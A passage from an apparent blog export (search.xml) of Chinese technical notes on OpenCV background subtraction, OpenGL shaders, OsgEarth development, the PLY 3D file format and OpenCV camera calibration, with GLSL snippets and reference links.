<li><a href="https://www.codenong.com/cs106835871/" target="_blank" rel="noopener">OSG实现鼠标拖拽物体</a>,by 码农家园.</li>
<li><a href="https://blog.csdn.net/qq_35040828/article/details/51760102" target="_blank" rel="noopener">OSG拾取对应的实体</a>,by 成魔的羔羊.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenCV学习笔记</title>
    <url>/2022/05/31/OpenCV%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="背景提取"><a href="#背景提取" class="headerlink" title="背景提取"></a>背景提取</h1><p>当观察场景的是一个固定的相机，背景几乎保持不变。在这种情况下，感兴趣的元素是在场景中运动的物体。我们将这些运动的物体称为前景，为了提取出这些前景物体，我们需要对背景建模，然后将当前帧的模型与背景模型进行比较，以检测前景物体。</p>
<p>运动前景对象的有效检测对于对象跟踪、目标分类、行为理解等后期处理至关重要。区分前景对象，关键的一个问题是：确定一个非常合适的背景。背景从象素的角度来理解，每一个象素就是有可能是前景点，也有可能是背景点，那么我们就要防止背景中误进入原属于前景点的对象，目前有几种常用的方法，但分别有利弊。</p>
<p>具体请参考<a href="https://blog.csdn.net/qq_41498261/article/details/103633583" target="_blank" rel="noopener">OpenCV视频篇——背景/前景提取</a>。</p>
<h2 id="固定背景提取法"><a href="#固定背景提取法" class="headerlink" title="固定背景提取法"></a>固定背景提取法</h2><h2 id="根据视频序列动态建立背景"><a href="#根据视频序列动态建立背景" class="headerlink" title="根据视频序列动态建立背景"></a>根据视频序列动态建立背景</h2><h3 id="均值法、中值法、滑动均值滤波、单高斯"><a href="#均值法、中值法、滑动均值滤波、单高斯" class="headerlink" title="均值法、中值法、滑动均值滤波、单高斯"></a>均值法、中值法、滑动均值滤波、单高斯</h3><h3 id="帧间差分法"><a href="#帧间差分法" class="headerlink" title="帧间差分法"></a>帧间差分法</h3><p>背景就是上一帧图像。每一帧与上一帧进行差分运算。</p>
<p>优点：速度较快，稳定性较好。</p>
<p>缺点：可能出现物体的“空洞现象”，空洞是由于某一大型运动物体，它的两帧之间存在象素十分接近的重合部分，所以导致这部分被差分剪去了。</p>
<h3 id="混合高斯法"><a href="#混合高斯法" class="headerlink" title="混合高斯法"></a>混合高斯法</h3><h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ol>
<li><a href="https://blog.csdn.net/LaoYuanPython/article/details/109105916" target="_blank" rel="noopener">OpenCV-Python图像乘法运算cv2.multiply函数详解及像素值溢出归一化处理</a>,by LaoYuanPython.</li>
<li><a href="https://www.cnblogs.com/shine-lee/p/9884551.html" target="_blank" rel="noopener">OpenCV各版本差异与演化，从1.x到4.0</a>,by 日拱一卒.</li>
<li><a href="https://zhuanlan.zhihu.com/p/37777074" target="_blank" rel="noopener">主成分分析（PCA）原理详解</a>.</li>
<li><a href="https://www.ruanyifeng.com/blog/2017/12/image-and-wave-filters.html" target="_blank" rel="noopener">图像与滤波</a>,by 阮一峰.</li>
<li><a href="https://blog.csdn.net/wsp_1138886114/article/details/102553174" target="_blank" rel="noopener">OpenCV—python 视频分析背景提取与前景提取</a>,by SongpingWang.</li>
<li><a href="https://blog.csdn.net/qq_41498261/article/details/103633583" target="_blank" rel="noopener">OpenCV视频篇——背景/前景提取</a>,by WaitFoF.</li>
<li><a href="https://zhuanlan.zhihu.com/p/126580277" target="_blank" rel="noopener">40. 如何消除摄影中的运动模糊?</a>,by Wang Hawk.</li>
<li><a href="https://its401.com/article/weixin_43532890/114523558" target="_blank" rel="noopener">基于opencv对高空拍摄视频消抖处理_js君-程序员ITS401</a>,by its401.</li>
<li><a href="https://zhuanlan.zhihu.com/p/38343732" target="_blank" rel="noopener">马尔科夫随机场(MRF)在深度学习图像处理中的应用-图像分割、纹理迁移</a>,by OLDPAN.</li>
<li><a href="http://www.apmygs.com/2479.html" target="_blank" rel="noopener">图像去噪（噪声）的主要算法</a>,by 工程之家.</li>
<li><a href="https://blog.csdn.net/liyuqian199695/article/details/49148053" target="_blank" rel="noopener">opencv2中的背景/前景分离（类BackgroundSubtractor）</a>,by 阳光下的Smiles.</li>
<li><a href="https://blog.csdn.net/jinshengtao/article/details/26278725" target="_blank" rel="noopener">混合高斯背景建模原理及实现</a>,by taotao1233.</li>
<li><a href="https://blog.csdn.net/Small_Munich/article/details/111957481" target="_blank" rel="noopener">【OpenCV学习系列】之Background Subtraction</a>,by AutoSleep.</li>
<li><a href="https://blog.csdn.net/iracer/article/details/51339377" target="_blank" rel="noopener">OpenCV —数据持久化: FileStorage类的数据存取操作与示例</a>,by iracer.</li>
<li><a href="https://www.cnblogs.com/freshmen/p/4534966.html" target="_blank" rel="noopener">OpenCV中InputArray和OutputArray使用方法</a>,by Curnane.</li>
<li><a href="https://blog.csdn.net/llh_1178/article/details/77833447" target="_blank" rel="noopener">图像处理之灰色图转化为RGB图像</a>,by llh_1178.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%87%A0%E4%BD%95%E4%B8%AD%E5%BF%83" target="_blank" rel="noopener">几何中心</a>,by wikipedia.</li>
<li><a href="https://www.cnblogs.com/xudong-bupt/p/3522457.html" target="_blank" rel="noopener">C++ vector 删除符合条件的元素</a>,by 旭东.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenGL学习笔记</title>
    <url>/2021/03/13/OpenGL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>OpenGL（英语：Open Graphics Library，译名：开放图形库或者“开放式图形库”）是用于渲染2D、3D矢量图形的跨语言、跨平台的应用程序编程接口（API）。这个接口由近350个不同的函数调用组成，用来从简单的图形比特绘制复杂的三维景象。而另一种程序接口系统是仅用于Microsoft Windows上的Direct3D。OpenGL常用于CAD、虚拟现实、科学可视化程序和电子游戏开发。</p>
<h1 id="核心模式与立即渲染模式"><a href="#核心模式与立即渲染模式" class="headerlink" title="核心模式与立即渲染模式"></a>核心模式与立即渲染模式</h1><p>早期的OpenGL使用立即渲染模式（Immediate mode，也就是固定渲染管线），这个模式下绘制图形很方便。OpenGL的大多数功能都被库隐藏起来，开发者很少有控制OpenGL如何进行计算的自由。而开发者迫切希望能有更多的灵活性。随着时间推移，规范越来越灵活，开发者对绘图细节有了更多的掌控。立即渲染模式确实容易使用和理解，但是效率太低。因此从OpenGL3.2开始，规范文档开始废弃立即渲染模式，并鼓励开发者在OpenGL的核心模式(Core-profile)下进行开发，这个分支的规范完全移除了旧的特性。</p>
<p>当使用OpenGL的核心模式时，OpenGL迫使我们使用现代的函数。当我们试图使用一个已废弃的函数时，OpenGL会抛出一个错误并终止绘图。现代函数的优势是更高的灵活性和效率，然而也更难于学习。立即渲染模式从OpenGL实际运作中抽象掉了很多细节，因此它在易于学习的同时，也很难让人去把握OpenGL具体是如何运作的。现代函数要求使用者真正理解OpenGL和图形编程，它有一些难度，然而提供了更多的灵活性，更高的效率，更重要的是可以更深入的理解图形编程。</p>
<h1 id="着色器"><a href="#着色器" class="headerlink" title="着色器"></a>着色器</h1><blockquote>
<p>着色器(Shader)是运行在GPU上的小程序。这些小程序为图形渲染管线的某个特定部分而运行。从基本意义上来说，着色器只是一种把输入转化为输出的程序。着色器也是一种非常独立的程序，因为它们之间不能相互通信；它们之间唯一的沟通只有通过输入和输出。</p>
</blockquote>
<p align="center">
    <img src="images/RenderingPipeline.png" width="50%" alt="GPU渲染管线"/>
</p>
<center>图1 GPU渲染管线</center>

<h2 id="着色器分类"><a href="#着色器分类" class="headerlink" title="着色器分类"></a>着色器分类</h2><p>每个着色器使用这两个关键字设定输入和输出，只要一个输出变量与下一个着色器阶段的输入匹配，它就会传递下去。但在顶点和片段着色器中会有点不同。</p>
<h3 id="顶点着色器"><a href="#顶点着色器" class="headerlink" title="顶点着色器"></a>顶点着色器</h3><p>用来描述顶点属性（如位置、颜色等）的程序。顶点是二维或者三维空间中的一个点，比如二维或者三维图形的端点或交点。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;顶点着色器程序</span><br><span class="line">var VSHADER_SCOURCE &#x3D; </span><br><span class="line">&#39;void main() &#123;\n&#39; +</span><br><span class="line">  &#39; gl_Position &#x3D; vec4(0.0, 0.0, 0.0, 1.0);\n&#39; +</span><br><span class="line">  &#39; gl_PointSize &#x3D; 5.0;\n&#39;+</span><br><span class="line">&#39;&#125;\n&#39;;</span><br></pre></td></tr></table></figure>

<h3 id="细分着色器"><a href="#细分着色器" class="headerlink" title="细分着色器"></a>细分着色器</h3><p>曲面细分着色器包含细分控制着色器 (Tessellation Control Shader / Hull Shader) 和细分计算着色器 (Tessellation Evaluation Shader / Domain Shader) 。在这个阶段可以操作三角形 (tri patch) 、四边形 (quad patch) 或者线段 (isoline) 等 patch 。</p>
<p>低精度网格、置换贴图和法线贴图等，在曲面细分着色器 (Tessellation Shader) 中，使用合适的细分算法，可以生成高精度网格，从而提高游戏画面的细节。</p>
<h3 id="几何着色器"><a href="#几何着色器" class="headerlink" title="几何着色器"></a>几何着色器</h3><p>几何着色器(Geometry Shader)是由第四代显卡着色器架构 Shader Model 4 正式引入的第三个着色器，属于渲染管线的一个可选阶段，位于曲面细分(Tessellation)和光栅化(Rasterization)之间。顶点着色器以顶点数据作为输入数据，而几何着色器则以完整的图元(Primitive)作为输入数据。例如，以三角形的三个顶点作为输入，然后输出对应的图元。与顶点着色器不能销毁或创建顶点不同，几何着色器的主要亮点就是可以创建或销毁几何图元，此功能让GPU可以实现一些有趣的效果。例如，根据输入图元类型扩展为一个或更多其他类型的图元，或者不输出任何图元。需要注意的是，几何着色器的输出图元不一定和输入图元相同。几何着色器的一个拿手好戏就是将一个点扩展为一个四边形(即两个三角形)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#version 330 core</span><br><span class="line">layout (points) in;</span><br><span class="line">layout (line_strip, max_vertices &#x3D; 2) out;</span><br><span class="line"></span><br><span class="line">void main() &#123;</span><br><span class="line">    gl_Position &#x3D; gl_in[0].gl_Position + vec4(-0.1, 0.0, 0.0, 0.0);</span><br><span class="line">    EmitVertex();</span><br><span class="line"></span><br><span class="line">    gl_Position &#x3D; gl_in[0].gl_Position + vec4(0.1, 0.0, 0.0, 0.0);</span><br><span class="line">    EmitVertex();</span><br><span class="line"></span><br><span class="line">    EndPrimitive();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="片元着色器"><a href="#片元着色器" class="headerlink" title="片元着色器"></a>片元着色器</h3><p>进行逐片元处理过程如光照的程序。片元可理解为像素。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;片元着色器程序</span><br><span class="line">var FSHADER_SCOURCE &#x3D; </span><br><span class="line">&#39;void main() &#123;\n&#39; +</span><br><span class="line">      &#39; gl_FragColor &#x3D; vec4(1.0, 0.0, 0.0, 1.0);\n&#39; +</span><br><span class="line">   &#39;&#125;\n&#39;;</span><br></pre></td></tr></table></figure>

<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="attribute变量"><a href="#attribute变量" class="headerlink" title="attribute变量"></a>attribute变量</h2><p>attribute变量是只能在vertex shader中使用的变量。（它不能在fragment shader中声明attribute变量，也不能被fragment shader中使用）</p>
<p>一般用attribute变量来表示一些顶点的数据，如：顶点坐标，法线，纹理坐标，顶点颜色等。</p>
<h2 id="uniform变量"><a href="#uniform变量" class="headerlink" title="uniform变量"></a>uniform变量</h2><p>Uniform变量简单理解就是一个GLSL shader中的全局常量，可以随意在任意shader(vertex shader, geometry shader, or fragment shader)访问，不同的shader中uniform是一起链接的，初始化之后，不能修改其值，否则会引起编译错误。</p>
<h2 id="varying变量"><a href="#varying变量" class="headerlink" title="varying变量"></a>varying变量</h2><p>varying变量是vertex和fragment shader之间做数据传递用的。一般vertex shader修改varying变量的值，然后fragment shader使用该varying变量的值。因此varying变量在vertex和fragment shader二者之间的声明必须是一致的。application不能使用此变量。</p>
<h1 id="坐标系"><a href="#坐标系" class="headerlink" title="坐标系"></a>坐标系</h1><p>OSG中采用的X轴正方向向右，Y轴正方向朝里，Z轴正方向向上。</p>
<p>OpenGL中采用的X轴正方向向右，Y轴正方向朝上，Z轴正方向朝外。</p>
<p align="center">
    <img src="images/axis.jpg" width="80%" alt="OSG与OpenGL坐标系"/>
</p>
<center>图2 OSG与OpenGL坐标系</center>


<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/OpenGL" target="_blank" rel="noopener">OpenGL</a>,by wikipedia.</li>
<li><a href="https://learnopengl-cn.github.io/" target="_blank" rel="noopener">LearnOpenGL</a>,by Joey de Vries.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%9D%80%E8%89%B2%E5%99%A8" target="_blank" rel="noopener">着色器</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/76775024" target="_blank" rel="noopener">几何着色器</a>,by 学无止境.</li>
<li><a href="https://zhuanlan.zhihu.com/p/51714057" target="_blank" rel="noopener">曲面细分着色器 1 简介</a>,by MultivacX.</li>
<li><a href="https://www.khronos.org/opengl/wiki/Rendering_Pipeline_Overview" target="_blank" rel="noopener">Rendering Pipeline Overview</a>,by opengl homepage.</li>
<li><a href="https://www.cnblogs.com/zenny-chen/p/4280100.html" target="_blank" rel="noopener">OpenGL 4.0的Tessellation Shader（细分曲面着色器）</a>,by  zenny_chen.</li>
<li><a href="https://zhuanlan.zhihu.com/p/33093968" target="_blank" rel="noopener">OpenGL基础 - 统一变量Uniform</a>,by 靖空间.</li>
<li><a href="https://www.cnblogs.com/graphics/archive/2010/07/10/1774809.html" target="_blank" rel="noopener">点到平面的距离公式</a>,by 翰墨小生.</li>
<li><a href="http://www.cppblog.com/acmiyou/archive/2009/08/02/91942.html" target="_blank" rel="noopener">OSG 碰撞检测之多面体求交器代码解读(PloytopeIntersector)</a>,by 风一样消逝的青春.</li>
<li><a href="https://blog.csdn.net/dcrmg/article/details/53133112" target="_blank" rel="noopener">OpenGL（八） 显示列表</a>,by -牧野-.</li>
<li><a href="https://xiaobazhang.github.io/2016/07/31/OSG-coordinate/" target="_blank" rel="noopener">OSG三维渲染引擎–OSG渲染引擎中坐标系</a>,by 苏黎.</li>
<li><a href="https://www.cnblogs.com/clingingboy/archive/2010/10/26/1861928.html" target="_blank" rel="noopener">OpenGL学习笔记(12)基本光照</a>,by Clingingboy.</li>
<li><a href="https://www.jianshu.com/p/eed3ebdad4fb" target="_blank" rel="noopener">GLSL 三种变量类型（uniform，attribute和varying）理解</a>,by wo不懂.</li>
<li><a href="https://blog.51cto.com/u_15753490/5581681" target="_blank" rel="noopener">OpenGL之glPolygonMode函数的用法</a>,by 草上爬_.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>OsgEarth开发经验记录</title>
    <url>/2022/09/21/OsgEarth%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="OsgEarth嵌入QT5方法"><a href="#OsgEarth嵌入QT5方法" class="headerlink" title="OsgEarth嵌入QT5方法"></a>OsgEarth嵌入QT5方法</h1><ul>
<li>使用osgQT</li>
<li>使用QOpenGLWidget</li>
</ul>
<h1 id="OsgEarth数字地球显示变形问题"><a href="#OsgEarth数字地球显示变形问题" class="headerlink" title="OsgEarth数字地球显示变形问题"></a>OsgEarth数字地球显示变形问题</h1><p>解决方案请参考<a href="https://codeantenna.com/a/pT9kuj9Zb3" target="_blank" rel="noopener">解决osgearh程序运行后对象变形的问题</a>。</p>
<h1 id="OsgEarth开发时的一些问题"><a href="#OsgEarth开发时的一些问题" class="headerlink" title="OsgEarth开发时的一些问题"></a>OsgEarth开发时的一些问题</h1><p>请参考<a href="https://www.cnblogs.com/indif/archive/2011/04/22/2024805.html" target="_blank" rel="noopener">OpenSceneGraph FAQ</a>。</p>
<h1 id="添加HUD到场景的三种方式"><a href="#添加HUD到场景的三种方式" class="headerlink" title="添加HUD到场景的三种方式"></a>添加HUD到场景的三种方式</h1><p>作为viewer的子相机；</p>
<p>作为viewer下根节点的一个子节点；</p>
<p>使用CompositeViewer，添加一个HUDView，使得HUDCamera作为HUDView的主相机。</p>
<h1 id="着色器自定义"><a href="#着色器自定义" class="headerlink" title="着色器自定义"></a>着色器自定义</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/lyggqm/p/6371287.html" target="_blank" rel="noopener">[osgearth]oe学习的一些经验（别人的）</a>,by 南水之源.</li>
<li><a href="https://codeantenna.com/a/Ql4XeTHHLS" target="_blank" rel="noopener">osgEarth嵌入qt的实现方式</a>,by codeantenna.</li>
<li><a href="https://blog.csdn.net/wb175208/article/details/106933696" target="_blank" rel="noopener">利用Qt来显示OSG并且设置相机的位置</a>,by wb175208.</li>
<li><a href="https://blog.csdn.net/sun_xf1/article/details/106075046" target="_blank" rel="noopener">Qt加载Osg的新方式osgQOpenGL简介</a>,by sun_xf1.</li>
<li><a href="https://blog.csdn.net/sungaoyong/article/details/120701823" target="_blank" rel="noopener">OsgEarth 2.x升级到3.1注意事项</a>,by 孙高勇.</li>
<li><a href="https://www.freesion.com/article/9876758947/" target="_blank" rel="noopener">OSGEARTH教程(三）——搭建MFC桌面端程序框架</a>,by 灰信网.</li>
<li><a href="https://codeantenna.com/a/pT9kuj9Zb3" target="_blank" rel="noopener">解决osgearh程序运行后对象变形的问题</a>,by codeantenna.</li>
<li><a href="https://blog.csdn.net/qq_40164094/article/details/114937370" target="_blank" rel="noopener">osg地球变形的解决方案</a>,by 紫沐衙.</li>
<li><a href="https://www.cnblogs.com/indif/archive/2011/04/22/2024805.html" target="_blank" rel="noopener">OpenSceneGraph FAQ</a>,by 水流云在.</li>
<li><a href="http://www.3wwang.cn/html/article_174.html" target="_blank" rel="noopener">OSG3.4内置Examples(osghud)解析</a>,by 3wwang.</li>
<li><a href="https://osg-users.openscenegraph.narkive.com/sVVWSdJM/hud-with-perspective" target="_blank" rel="noopener">HUD with perspective</a>,by arnaud houegbelo.</li>
<li><a href="https://osg-users.openscenegraph.narkive.com/pKOu8JmL/how-a-hud-camera-respond-to-the-resize-event" target="_blank" rel="noopener">how a hud-camera respond to the resize event</a>,by wu xiaodong.</li>
<li><a href="https://www.cnblogs.com/shapherd/archive/2010/08/10/osg.html" target="_blank" rel="noopener">OSG开发概览</a>,by ShaPherD.</li>
<li><a href="https://cloud.tencent.com/developer/article/1713617" target="_blank" rel="noopener">OpenGL ES 多目标渲染（MRT）</a>,by 字节流动.</li>
<li><a href="https://www.cnblogs.com/lyggqm/p/12836601.html" target="_blank" rel="noopener">[原][译]关于osgEarth::VirtualProgram说明</a>,by 南水之源.</li>
<li><a href="https://blog.csdn.net/qq_38378235/article/details/125837259" target="_blank" rel="noopener">osgearth学习笔记2：星空效果显示</a>,by 新晋小菜鸟.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>PLY文件格式分析</title>
    <url>/2019/06/04/PLY%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>PLY文件是一种存储3D模型的文件格式，全名为多边形档案（Polygon File Format）或 史丹佛三角形档案（Stanford Triangle Format）。</p>
<p>该格式主要用以储存立体扫描结果的三维数值，透过多边形片面的集合描述三维物体，与其他格式相较之下这是较为简单的方法。它可以储存的资讯包含颜色、透明度、表面法向量、材质座标与资料可信度，并能对多边形的正反两面设定不同的属性。</p>
<p>在档案内容的储存上PLY有两种版本，分别是纯文字（ASCII）版本与二元码（binary）版本，其差异在储存时是否以ASCII编码表示元素资讯。</p>
<p>通过分析PLY文件格式，我们可以进而初窥存储3D模型的文件奥秘。</p>
<h1 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h1><p>各种文件格式通常分成文件头和文件内容，PLY格式也不例外。</p>
<p>每个PLY档都包含档头（header），用以设定网格模型的“元素”与“属性”，以及在档头下方接着一连串的元素“数值资料”。一般而言，网格模型的“元素”就是顶点（vertices）、面（faces），另外还可能包含有边（edges）、深度图样本（samples of range maps）与三角带（triangle strips）等元素。无论是纯文字与二元码的PLY档，档头资讯都是以ASCII编码编写，接续其后的数值资料才有编码之分。</p>
<p>PLY档案以此行作为开头，以识别PLY格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ply</span><br></pre></td></tr></table></figure>

<p>接着第二行是版本资讯，目前有三种写法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">format ascii 1.0</span><br><span class="line">format binary_little_endian 1.0</span><br><span class="line">format binary_big_endian 1.0</span><br></pre></td></tr></table></figure>

<p>其中ascii, binary_little_endian, binary_big_endian是档案储存的编码方式，而1.0是遵循的标准版本（现阶段仅有PLY 1.0版）。在档头中可使用’comment’作为一行的开头以编写注解，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">comment This is a comment!</span><br></pre></td></tr></table></figure>

<p>描述元素及属性，必须使用’element’及’property’的关键字，一般的格式为element下方接着属性列表，例如:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">element &lt;element name&gt; &lt;number in file&gt;</span><br><span class="line">property &lt;data_type&gt; &lt;property name 1&gt;</span><br><span class="line">property &lt;data_type&gt; &lt;property name 2&gt;</span><br><span class="line">property &lt;data_type&gt; &lt;property name 3&gt;</span><br></pre></td></tr></table></figure>

<p>‘property’不仅定义了资料的型态，其出现顺序亦定义了资料的顺序。内定的资料形态有两种写法：一种是char uchar short ushort int uint float double,另外一种是具有位元长度的int8 uint8 int16 uint16 int32 uint32 float32 float64。 例如，描述一个包含12个顶点的物体，每个顶点使用3个单精度浮点数 (x,y,z）代表点的座标，使用3个unsigned char代表顶点颜色，颜色顺序为 (B, G, R),则档头的写法为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">element vertex 12</span><br><span class="line">property float x</span><br><span class="line">property float y</span><br><span class="line">property float z</span><br><span class="line">property uchar blue</span><br><span class="line">property uchar green</span><br><span class="line">property uchar red</span><br></pre></td></tr></table></figure>

<p>其中vertex是内定的元素类型，接续的6行property描述构成vertex元素的数值字段顺序代表的意义，及其资料形态。</p>
<p>另一个常使用的元素是面。由于一个面是由3个以上的顶点所组成，因此使用一个“顶点列表”即可描述一个面, PLY格式使用一个特殊关键字’property list’定义之。 例如，一个具有10个面的物体，其PLY档头可能包含：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">element face 10</span><br><span class="line">property list uchar int vertex_indices</span><br></pre></td></tr></table></figure>

<p>‘property list’表示该元素face的特性是由一行的顶点列表来描述。列表开头以uchar型态的数值表示列表的项目数，后面接着资料型态为int的顶点索引值（vertex_indices），顶点索引值从0开始。</p>
<p>最后，标头必须以此行结尾：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">end_header</span><br></pre></td></tr></table></figure>

<p>档头后接着的是元素资料（端点座标、拓朴连结等）。在ASCII格式中各个端点与面的资讯都是以独立的一行描述，而二元编码格式则连续储存这些资料，载入时须以’element’定义的元素数目以及’property’中设定的资料形态计算各笔字段的长度。</p>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>一个典型的PLY文件结构分成三部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文件头 (从ply开始到end_header）</span><br><span class="line">顶点元素列表</span><br><span class="line">面元素列表</span><br></pre></td></tr></table></figure>

<p>其中的顶点元素列表一般以x y z方式排列，形态如文件头所定义；而面元素列表是以下列格式表示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;组成面的端点數N&gt; &lt;端点#1的索引&gt; &lt;端点#2的索引&gt; ... &lt;端点#N的索引&gt;</span><br></pre></td></tr></table></figure>

<p>以存储一个立方体模型的PLY文件为例，其内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ply</span><br><span class="line">format ascii 1.0</span><br><span class="line">comment made by anonymous</span><br><span class="line">comment this file is a cube</span><br><span class="line">element vertex 8</span><br><span class="line">property float32 x</span><br><span class="line">property float32 y</span><br><span class="line">property float32 z</span><br><span class="line">element face 12</span><br><span class="line">property list uint8 int32 vertex_index</span><br><span class="line">end_header</span><br><span class="line">0 0 0</span><br><span class="line">0 25.8 0</span><br><span class="line">18.9 0 0</span><br><span class="line">18.9 25.8 0</span><br><span class="line">0 0 7.5</span><br><span class="line">0 25.8 7.5</span><br><span class="line">18.9 0 7.5</span><br><span class="line">18.9 25.8 7.5</span><br><span class="line">3 5 1 0</span><br><span class="line">3 5 4 0</span><br><span class="line">3 4 0 2</span><br><span class="line">3 4 6 2</span><br><span class="line">3 7 5 4</span><br><span class="line">3 7 6 4</span><br><span class="line">3 3 2 1</span><br><span class="line">3 1 2 0</span><br><span class="line">3 5 7 1</span><br><span class="line">3 7 1 3</span><br><span class="line">3 7 6 3</span><br><span class="line">3 6 3 2</span><br></pre></td></tr></table></figure>

<p>PLY文件可用blender软件打开。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/PLY" target="_blank" rel="noopener">PLY</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/sinat_20530977/article/details/44805107" target="_blank" rel="noopener">Opengl学习笔记：（一）.Ply文件文件格式和文件读取</a>,by  为何走到这里.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenCV4.0相机标定教程</title>
    <url>/2019/04/28/OpenCV4-0%E7%9B%B8%E6%9C%BA%E6%A0%87%E5%AE%9A%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>相机已经存在了很长时间。 然而，随着20世纪后期廉价针孔相机的推出，它们成为我们日常生活中的常见现象。 不幸的是，这种便宜与其价格有关：严重失真。 幸运的是，这些是常数，并且通过校准和一些重新映射，我们可以纠正这一点。 此外，通过校准，您还可以确定相机的自然单位（像素）与真实世界单位（例如毫米）之间的关系。这个校准过程就是相机标定。</p>
<h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><p>对于失真，OpenCV考虑了径向和切向因子。 对于径向因子，使用以下公式：</p>
<p>$$x_{distorted} = x( 1 + k_1 r^2 + k_2 r^4 + k_3 r^6) \ y_{distorted} = y( 1 + k_1 r^2 + k_2 r^4 + k_3 r^6)$$</p>
<p>因此，对于$（x，y）$坐标处的未失真像素点，其在失真图像上的位置将是$（x_{distorted},y_{distorted}）$。 径向变形的存在表现为“桶状”或“鱼眼”效应。</p>
<p>由于摄像镜头与成像平面不完全平行，因此会发生偏心畸变。 它可以通过公式表示：</p>
<p>$$x_{distorted} = x + [ 2p_1xy + p_2(r^2+2x^2)] \ y_{distorted} = y + [ p_1(r^2+ 2y^2)+ 2p_2xy]$$</p>
<p>所以我们有五个失真参数，在OpenCV中呈现为一行矩阵，有5列：</p>
<p>$$distortion_coefficients=(k_1 \hspace{10pt} k_2 \hspace{10pt} p_1 \hspace{10pt} p_2 \hspace{10pt} k_3)$$</p>
<p>现在我们使用以下公式进行单位转换：</p>
<p>$$\left [ \begin{matrix} x \ y \ w \end{matrix} \right ] = \left [ \begin{matrix} f_x &amp; 0 &amp; c_x \ 0 &amp; f_y &amp; c_y \ 0 &amp; 0 &amp; 1 \end{matrix} \right ] \left [ \begin{matrix} X \ Y \ Z \end{matrix} \right ]$$</p>
<p>这里通过使用单应性坐标系（和$w = Z$）来解释$w$的存在。 未知参数是$f_x$和$f_y$（相机焦距）和（$c_x，c_y$），它们是以像素坐标表示的光学中心。 如果对于两个轴，使用具有给定纵横比（通常为1）的共同焦距，则$f_y = f_x * a$，并且在上部公式中，我们将具有单个焦距$f$。 包含这四个参数的矩阵称为<strong>相机矩阵</strong>。 虽然无论使用何种相机分辨率，失真系数都是相同的，但应根据校准分辨率的当前分辨率进行缩放。</p>
<p>确定这两个矩阵的过程是校准。 通过基本几何方程计算这些参数。 使用的等式取决于所选择的校准对象。 目前，OpenCV支持三种类型的校准对象：</p>
<ul>
<li>古典黑白棋枰</li>
<li>对称的圆圈图案</li>
<li>不对称的圆圈图案</li>
</ul>
<p>基本上，您需要使用相机拍摄这些图案的快照，然后让OpenCV找到它们。 每个找到的模式都会产生一个新的等式。 要求解方程，您需要至少预定数量的模式快照，以形成一个良好的方程系统。 棋盘图案的数量较高，圆圈图案的数量较少。 例如，理论上棋盘图案需要至少两个快照。 但是，实际上我们的输入图像中存在大量噪声，因此为了获得良好的结果，您可能需要至少10个不同位置的输入模式的快照。</p>
<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>OpenCV4.0中相机标定样例程序的目标：</p>
<ul>
<li>确定失真矩阵</li>
<li>确定相机矩阵</li>
<li>从摄像机，视频和图像文件列表中获取输入</li>
<li>从XML / YAML文件中读取配置</li>
<li>将结果保存到XML / YAML文件中</li>
<li>计算重新投影误差</li>
</ul>
